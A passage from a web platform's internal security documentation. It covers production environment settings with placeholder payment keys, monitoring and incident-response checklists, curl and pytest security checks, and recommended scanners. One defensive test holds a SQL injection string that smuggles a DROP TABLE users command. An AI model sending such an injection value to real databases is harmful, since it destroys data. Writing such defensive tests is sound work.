# ZaloPay
ZALOPAY_APP_ID=<production-app-id>
ZALOPAY_KEY1=<production-key1>
ZALOPAY_KEY2=<production-key2>
ZALOPAY_ENDPOINT=https://openapi.zalopay.vn/v2
ZALOPAY_CALLBACK_URL=https://api.viecz.vn/api/v1/payments/zalopay/callback
ZALOPAY_REDIRECT_URL=https://viecz.zalopay.vn/#/payment/result

# Platform
PLATFORM_FEE_PERCENT=10

# Mock Payment (MUST BE FALSE)
MOCK_PAYMENT_ENABLED=false

# Logging
LOG_LEVEL=INFO
LOG_DIR=/var/log/viecz
```

### 11.3 Monitoring Requirements

**Security Monitoring:**

- [ ] Failed login attempts
- [ ] Payment failures/retries
- [ ] Unusual wallet activity
- [ ] API rate limit violations
- [ ] 401/403 error spikes
- [ ] Database connection errors

**Alerting:**

```python
# Example: Alert on multiple failed logins
if failed_login_count > 5:
    send_alert("Security", f"User {user_id} failed login 5 times")
```

**Log Aggregation:**

- [ ] Send logs to centralized system (e.g., ELK, Splunk)
- [ ] Retain logs for 90 days minimum
- [ ] Set up alerts for critical errors
- [ ] Monitor ZaloPay callback failures

### 11.4 Incident Response Plan

**Security Incident Types:**

1. **Token Compromise:** User reports stolen token
2. **Payment Fraud:** Suspicious transaction detected
3. **Data Breach:** Unauthorized database access
4. **API Abuse:** DDoS or scraping attack

**Response Procedure:**

```
1. Detect: Monitor alerts, user reports
2. Contain: Disable affected accounts, rotate secrets
3. Investigate: Check logs, identify scope
4. Remediate: Fix vulnerability, restore service
5. Report: Notify affected users, document incident
6. Review: Update security measures, prevent recurrence
```

### 11.5 Security Testing

**Manual Testing:**

```bash
# Test authentication
curl -X POST http://localhost:8000/api/v1/auth/zalo \
  -H "Content-Type: application/json" \
  -d '{"access_token": "invalid"}'

# Test authorization
curl -X GET http://localhost:8000/api/v1/users/me \
  -H "Authorization: Bearer invalid-token"

# Test input validation
curl -X POST http://localhost:8000/api/v1/tasks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title": "", "price": -100}'
```

**Automated Testing:**

```python
# tests/security/test_auth.py

def test_invalid_token_returns_401():
    response = client.get("/api/v1/users/me", headers={"Authorization": "Bearer invalid"})
    assert response.status_code == 401

def test_sql_injection_prevented():
    malicious_id = "1; DROP TABLE users; --"
    response = client.get(f"/api/v1/tasks/{malicious_id}")
    # Should return 422 (validation error) or 404, not 500
    assert response.status_code in [422, 404]
```

### 11.6 Compliance & Auditing

**Privacy:**

- [ ] Privacy policy published
- [ ] User data deletion procedure
- [ ] GDPR consent (if EU users)
- [ ] Data processing agreement

**Financial:**

- [ ] Transaction audit trail
- [ ] Financial reconciliation
- [ ] Tax reporting capability
- [ ] Anti-money laundering checks

**Security:**

- [ ] Annual penetration test
- [ ] Quarterly security review
- [ ] Vulnerability disclosure policy
- [ ] Security incident log

---

## Appendix A: Security Tools

### Recommended Tools

**Static Analysis:**

```bash
# Install bandit
pip install bandit

# Scan for security issues
bandit -r backend/app -ll
```

**Dependency Scanning:**

```bash
# Check for vulnerable dependencies
pip install safety
safety check --json
```

**Secrets Scanning:**

```bash
# Detect committed secrets
pip install detect-secrets
detect-secrets scan --all-files
```

**API Testing:**

- **Postman:** Manual API testing
- **OWASP ZAP:** Automated security scanning
- **Burp Suite:** Web application testing

---

## Appendix B: Security Contacts

**Internal Team:**

- Tech Lead: [Contact info]
- Security Officer: [Contact info]
- DevOps Engineer: [Contact info]

**External Services:**

- Zalo Support: https://developers.zalo.me/support
- ZaloPay Support: merchants.zalopay.vn

**Incident Reporting:**

- Email: security@viecz.vn
- Phone: [Emergency contact]

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-02-04 | Tech Lead | Initial security documentation |

---

**Confidential:** This document contains sensitive security information. Do not share publicly.
